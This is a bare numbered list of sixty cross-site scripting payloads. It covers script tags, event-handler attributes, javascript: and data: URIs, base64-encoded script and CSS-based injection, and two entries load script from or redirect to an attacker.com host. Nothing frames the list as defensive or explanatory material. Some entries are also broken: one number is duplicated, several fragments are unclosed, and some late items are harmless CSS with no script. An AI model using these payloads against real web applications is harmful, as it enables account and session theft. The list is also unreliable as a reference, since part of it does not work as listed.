# XSS Payloads

1. `<script>alert('XSS')</script>`
2. `<img src="x" onerror="alert('XSS')">`
3. `<body onload="alert('XSS')">`
4. `<input type="text" value="XSS" autofocus onfocus="alert(this.value)">`
5. `<svg/onload="alert('XSS')">`
6. `<div style="width:expression(alert('XSS'));">`
7. `<iframe src="javascript:alert('XSS');">`
8. `<a href="javascript:alert('XSS');">Click me</a>`
9. 9. `<script src="http://attacker.com/xss.js"></script>`
10. `<img src="x" onerror="window.location='http://attacker.com'">`
11. `<div style="background:url(javascript:alert('XSS'))"></div>`
12. `<a href="#" onclick="alert('XSS');return false;">Click me</a>`
13. `<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"></svg>`
14. `<object data="javascript:alert('XSS')"></object>`
15. `<embed src="javascript:alert('XSS')"></embed>`
16. `<form action="javascript:alert('XSS')"><input type="submit"></form>`
17. `<base href="javascript:alert('XSS');//">`
18. `<isindex formaction="javascript:alert('XSS')">`
19. `<li style=list-style:url() onerror=alert('XSS')>`
20. `<style>@import 'javascript:alert("XSS")';</style>`
21. `<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">`
22. `<table background="javascript:alert('XSS')">`
23. `<b style="color:expression(alert('XSS'))">XSS</b>`
24. `<img dynsrc="javascript:alert('XSS')">`
25. `<input type="image" dynsrc="javascript:alert('XSS')">`
26. `<layer src="javascript:alert('XSS')"></layer>`
27. `<style>:hover{color:expression(alert('XSS'))}</style>`
28. `<a href="javascript:void(0)" onmouseover="alert('XSS')">Hover me!</a>`
29. `<img lowsrc="javascript:alert('XSS')">`
30. `<bgsound src="javascript:alert('XSS');">`
31. `<br size="&{alert('XSS')}">`
32. `<link rel="stylesheet" href="javascript:alert('XSS');">`
33. `<table style="position:absolute;background:url(javascript:alert('XSS'))">`
34. `<div style="behavior:url(javascript:alert('XSS'))"></div>`
35. `<style>@import 'data:,<svg/onload=alert(1)>'</style>`
36. `<frameset onload=alert('XSS')>`
37. `<table background="data:image/svg+xml,%3Csvg/%3E%3Cscript%3Ealert(1)%3C/script%3E">`
38. `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></object>`
39. `<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoJ1hTUycpPC9zY3JpcHQ%2BPC9zdmc%2B"></embed>`
40. `<style>@import 'data:text/css,<svg/onload=alert(1)>'</style>`
41. `<iframe srcdoc="<svg/onload=alert(1)>"></iframe>`
42. `<iframe src="data:text/html,%3Csvg%2Fonload%3Dalert(1)%3E"></iframe>`
43. `<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">`
44. `<svg><style>{font-family&colon;'<iframe/onload=alert(1)>'
45. `<iframe/onreadystatechange=alert(1)`
46. `<svg><style>&commat;import'data:&comma;<svg/onload=alert(1)>'</style>`
47. `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`
48. `<svg><style>&commat;import'data:&comma;<frameset/onload=alert(1)>'</style>`
49. `<table style="background-image: url('x'), url('x'), url('x'), url(data:image/svg+xml,%3Csvg/%3E%3Cscript%3Ealert(1)%3C/script%3E);">`
50. `<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">X</a></a><a href="javascript:alert(2)">X</a>`
51. `<style>@keyframes x{from {left:0;}to {left: 1000px;}} :target {animation:10s ease-in-out 0s 1 x;}</style><p id=x style="position:absolute;">`
52. `<style>@keyframes slidein {from {margin-left:100%;width:300%;}to {margin-left:0%;width:100%;}} div {animation-duration: 3s;animation-name: slidein;}</style><div>`
53. `<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMik%2B"></object>`
54. `<marquee loop=1 width=0 onfinish=alert(1)>`
55. `<link rel=next href=javascript:alert(1)>`
56. `<style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>`
57. `<style>*{transition:all 4s}*:target{width:10000px!important}</style><p id=x>`
58. `<style>@media screen and (min-width:40000px){body{left:0;transition:.1s;}} body:hover{position:fixed;left:-10000px;}</style>`
59. `<style>:root{font-family:'-apple-system',san-serif;}</style><input>`
60. `<style>:target {transform: rotate(180deg);}</style><p id=x>`